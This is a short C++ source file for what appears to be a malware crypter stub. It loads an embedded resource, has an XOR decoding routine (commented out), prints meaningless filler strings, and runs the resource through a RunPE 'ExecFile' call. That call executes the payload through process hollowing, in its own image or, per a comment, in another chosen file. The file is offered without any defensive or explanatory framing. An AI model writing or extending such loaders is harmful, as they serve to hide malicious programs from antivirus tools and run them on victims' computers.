#include <iostream>
#include <Windows.h>
#include "Runpe.h"

int Rsize;
char* RData;

void Resource(int id)
{
	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
	HGLOBAL temp = LoadResource(NULL, hResource);
	Rsize = SizeofResource(NULL, hResource);
	RData = (char*)LockResource(temp);
}

void enc()
{
	char cipher[] = "cipher";
	for (int i = 0; i < Rsize; i++)
		RData[i] ^= cipher[i % strlen(cipher)];
}

int main()
{

	for (int i = 0; i < 12; i++) {
		std::cout << i << "absdjahsd";
	}

	Resource(1);
	//enc();
	for (int i = 0; i < 22; i++) {
		std::cout << i << "dfhsfgsd";
	}
	LPVOID pFile;
	TCHAR szFilePath[1024];

	pFile = RData;
	if (pFile)
	{
		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
		//replace process.exe with "szFilePath" if you want to inject it in the SAME file.
		//or you may write the file path you want to inject in.
		ExecFile(LPSTR(szFilePath), pFile);
	}
	MessageBoxA(0, "qq", "hahaha", 0);
	return 0;
};